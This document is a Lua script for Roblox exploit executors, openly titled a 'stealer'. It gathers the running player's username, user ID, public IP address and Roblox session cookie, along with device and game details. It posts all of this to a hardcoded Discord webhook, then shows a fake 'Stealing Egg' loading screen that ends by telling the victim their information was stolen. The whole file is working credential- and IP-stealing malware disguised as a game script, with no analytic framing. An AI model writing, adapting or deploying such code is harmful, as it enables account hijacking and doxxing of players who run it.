-- ULTIMATE STEALER – CRASH-PROOF (Direct Paste)
local webhook = "https://discord.com/api/webhooks/1545855831453474816/68zNp9FU7svcVfUqN4HGLf8Hp0IsTyW-LOI0jCBLB3o0NlbDThj0BfrUcg7mMJ6mPVMg"

local function sendData(url, jsonPayload)
    local headers = {["Content-Type"] = "application/json"}
    local methods = {
        function() return request({Url = url, Method = "POST", Headers = headers, Body = jsonPayload}) end,
        function() return http_request({Url = url, Method = "POST", Headers = headers, Body = jsonPayload}) end,
        function() return game:GetService("HttpService"):PostAsync(url, jsonPayload, Enum.HttpContentType.ApplicationJson) end
    }
    for _, method in ipairs(methods) do
        local ok, res = pcall(method)
        if ok and res then return true end
    end
    return false
end

local function getIP()
    local ip = "N/A"
    local ok, res = pcall(function() return request({Url = "https://api.ipify.org", Method = "GET"}) end)
    if ok and res and res.Body and res.Body ~= "" then
        ip = res.Body:gsub("%s+", "")
        if ip ~= "" then return ip end
    end
    ok, res = pcall(function() return http_request({Url = "https://api.ipify.org", Method = "GET"}) end)
    if ok and res and res.Body and res.Body ~= "" then
        ip = res.Body:gsub("%s+", "")
        if ip ~= "" then return ip end
    end
    local services = {
        "https://api.ipify.org",
        "https://ip-api.com/json/?fields=query",
        "https://icanhazip.com",
        "https://httpbin.org/ip",
        "https://checkip.amazonaws.com/"
    }
    for _, url in ipairs(services) do
        local ok, result = pcall(function() return game:GetService("HttpService"):GetAsync(url) end)
        if ok and result and result ~= "" then
            if result:match('"query":"(.-)"') then
                ip = result:match('"query":"(.-)"')
            elseif result:match('"origin":"(.-)"') then
                ip = result:match('"origin":"(.-)"')
            else
                ip = result:gsub("%s+", "")
            end
            if ip and ip ~= "" and ip ~= "N/A" then break end
        end
    end
    return ip
end

local function safeGet(obj, prop, default)
    local success, val = pcall(function() return obj[prop] end)
    if success and val ~= nil then
        return val
    else
        return default
    end
end

local function collectInfo()
    local info = {}
    info.executor = (getexecutorname and getexecutorname()) or (identifyexecutor and identifyexecutor()) or "Delta"
    local player = game.Players.LocalPlayer
    if player then
        info.userId = tostring(player.UserId)
        info.userName = player.Name
        info.displayName = player.DisplayName
        local id = player.UserId
        if id and id > 0 then
            local year = math.floor((id / 100000000) * 2) + 2006
            info.accountAge = tostring(year) .. " (approx)"
        end
        local ok, friends = pcall(function() return #player:GetFriendsOnline() end)
        info.friends = ok and tostring(friends) or "N/A"
        pcall(function()
            local char = player.Character
            if char then
                local hum = char:FindFirstChild("Humanoid")
                if hum then
                    info.health = tostring(hum.Health)
                    info.maxHealth = tostring(hum.MaxHealth)
                    info.walkSpeed = tostring(hum.WalkSpeed)
                    info.jumpPower = tostring(hum.JumpPower)
                end
                local root = char:FindFirstChild("HumanoidRootPart")
                if root then
                    info.position = tostring(root.Position)
                end
            end
        end)
    end
    info.placeId = tostring(safeGet(game, "PlaceId", "N/A"))
    info.jobId = safeGet(game, "JobId", "N/A")
    info.gameName = safeGet(game, "Name", "Unknown")
    info.creatorId = tostring(safeGet(game, "CreatorId", "N/A"))
    info.maxPlayers = tostring(safeGet(game, "MaxPlayers", "N/A"))
    info.serverTime = tostring(safeGet(game, "ServerTime", "N/A"))
    info.ip = getIP()
    local cookieOk, cookieVal = pcall(function() return getcookie("https://www.roblox.com/") end)
    info.cookie = cookieOk and cookieVal or "Not available (Delta)"
    pcall(function()
        local us = game:GetService("UserInputService")
        info.platform = tostring(us.Platform)
        info.touchEnabled = tostring(us.TouchEnabled)
        info.mouseEnabled = tostring(us.MouseEnabled)
        info.keyboardEnabled = tostring(us.KeyboardEnabled)
        info.graphics = tostring(game:GetService("GraphicsSettings").GraphicsQualityLevel)
        info.volume = tostring(game:GetService("SoundService").Volume)
        local starterGui = game:GetService("StarterGui")
        local camMode, theme
        pcall(function() camMode = starterGui:GetCore("CameraMode") end)
        pcall(function() theme = starterGui:GetCore("Theme") end)
        info.cameraMode = camMode or "Unknown"
        info.theme = theme or "Unknown"
    end)
    pcall(function()
        local stats = game:GetService("Stats")
        info.ping = tostring(stats.Network.ServerStatsItem["Data Ping"]:GetValueString())
        info.connected = tostring(stats.Network.Connected)
    end)
    pcall(function()
        local run = game:GetService("RunService")
        local frameTime = run.RenderStepTime
        if frameTime and frameTime > 0 then
            info.fps = tostring(math.floor(1 / frameTime))
        end
    end)
    pcall(function()
        local ls = player:FindFirstChild("leaderstats")
        if ls then
            local stats = {}
            for _, stat in ipairs(ls:GetChildren()) do
                if stat:IsA("NumberValue") or stat:IsA("IntValue") or stat:IsA("StringValue") then
                    stats[stat.Name] = tostring(stat.Value)
                end
            end
            info.leaderstats = game:GetService("HttpService"):JSONEncode(stats)
        else
            info.leaderstats = "None"
        end
    end)
    pcall(function()
        local backpack = player:FindFirstChild("Backpack")
        if backpack then
            local items = {}
            for _, item in ipairs(backpack:GetChildren()) do
                if item:IsA("Tool") or item:IsA("HopperBin") then
                    table.insert(items, item.Name)
                end
            end
            info.backpack = (#items > 0) and table.concat(items, ", ") or "Empty"
        end
    end)
    return info
end

local function buildEmbed(data)
    local fields = {}
    for k, v in pairs(data) do
        if v and v ~= "" then
            table.insert(fields, {name = k, value = tostring(v), inline = true})
        end
    end
    return {
        embeds = {{
            title = "Roblox Stealer Log (Ultimate)",
            color = 0xFF0000,
            fields = fields,
            footer = {text = "Delta Executor"}
        }}
    }
end

local info = collectInfo()
local embed = buildEmbed(info)
local json = game:GetService("HttpService"):JSONEncode(embed)
sendData(webhook, json)

-- Fake Loading GUI
local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
local gui = Instance.new("ScreenGui")
gui.Parent = playerGui
gui.ResetOnSpawn = false

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 350, 0, 180)
frame.Position = UDim2.new(0.5, -175, 0.5, -90)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.BackgroundTransparency = 0.15
frame.Parent = gui
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 10)
title.BackgroundTransparency = 1
title.Text = "Stealing Egg..."
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextScaled = true
title.Font = Enum.Font.GothamBold
title.Parent = frame

local bg = Instance.new("Frame")
bg.Size = UDim2.new(0.8, 0, 0, 20)
bg.Position = UDim2.new(0.1, 0, 0.45, 0)
bg.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
bg.Parent = frame
Instance.new("UICorner", bg).CornerRadius = UDim.new(0, 10)

local fill = Instance.new("Frame")
fill.Size = UDim2.new(0, 0, 1, 0)
fill.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
fill.Parent = bg
Instance.new("UICorner", fill).CornerRadius = UDim.new(0, 10)

local percent = Instance.new("TextLabel")
percent.Size = UDim2.new(0, 60, 0, 30)
percent.Position = UDim2.new(0.5, -30, 0.7, 0)
percent.BackgroundTransparency = 1
percent.Text = "0%"
percent.TextColor3 = Color3.fromRGB(255, 255, 255)
percent.TextScaled = true
percent.Font = Enum.Font.Gotham
percent.Parent = frame

local sub = Instance.new("TextLabel")
sub.Size = UDim2.new(1, 0, 0, 30)
sub.Position = UDim2.new(0, 0, 0.85, 0)
sub.BackgroundTransparency = 1
sub.Text = "Please wait..."
sub.TextColor3 = Color3.fromRGB(200, 200, 200)
sub.TextScaled = true
sub.Font = Enum.Font.Gotham
sub.Parent = frame

local function animate()
    local duration = 3
    local steps = 60
    local stepTime = duration / steps
    for i = 0, steps do
        local progress = i / steps
        local width = 0.8 * progress
        fill:TweenSize(UDim2.new(width, 0, 1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Linear, stepTime, false)
        percent.Text = string.format("%d%%", math.floor(progress * 100))
        if i < steps then
            task.wait(stepTime)
        end
    end
    title.Text = "U GOT YOUR INFOMATION STOLEN LMAO"
    title.TextColor3 = Color3.fromRGB(255, 0, 0)
    sub.Text = "Your data has been sent to the owner."

    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 100, 0, 35)
    closeBtn.Position = UDim2.new(0.5, -50, 1, -45)
    closeBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    closeBtn.Text = "Close"
    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeBtn.TextScaled = true
    closeBtn.Font = Enum.Font.Gotham
    closeBtn.Parent = frame
    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 8)
    closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)
end

task.wait(0.1)
spawn(animate)
